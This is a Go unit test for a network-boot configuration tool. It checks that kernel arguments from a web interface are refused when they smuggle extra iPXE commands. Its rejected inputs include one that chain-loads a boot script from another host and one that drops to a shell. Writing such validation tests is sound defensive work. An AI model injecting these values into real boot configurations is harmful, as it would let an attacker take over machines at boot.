package config

import "testing"

// Kernel arguments typed in the web interface end up on an iPXE command line, where a separate && || or ; starts another command.
func TestKernelArgumentsThatWouldStartAnotherIPXECommandAreRefused(t *testing.T) {
	for _, bad := range []string{"nomodeset && chain http://elsewhere/boot.ipxe", "quiet || shell", "a ; b", "a" + string(rune(9)) + "b", "a" + string(rune(11)) + "b"} {
		if _, err := CleanArgs(bad); err == nil {
			t.Errorf("%q is accepted", bad)
		}
		c := Config{Args: map[string]string{"abc1234567": bad}}
		if err := c.Validate(); err == nil {
			t.Errorf("an ISO's arguments %q are accepted", bad)
		}
		c = Config{PCOptions: map[string]PCOptions{"aa:bb:cc:dd:ee:ff": {Args: bad}}}
		if err := c.Validate(); err == nil {
			t.Errorf("a PC's arguments %q are accepted", bad)
		}
	}
	for _, ok := range []string{"nomodeset", "console=ttyS0,115200n8 loglevel=7", "ds=nocloud-net;s=http://x/", "  nomodeset  "} {
		if _, err := CleanArgs(ok); err != nil {
			t.Errorf("%q is refused: %v", ok, err)
		}
	}
}
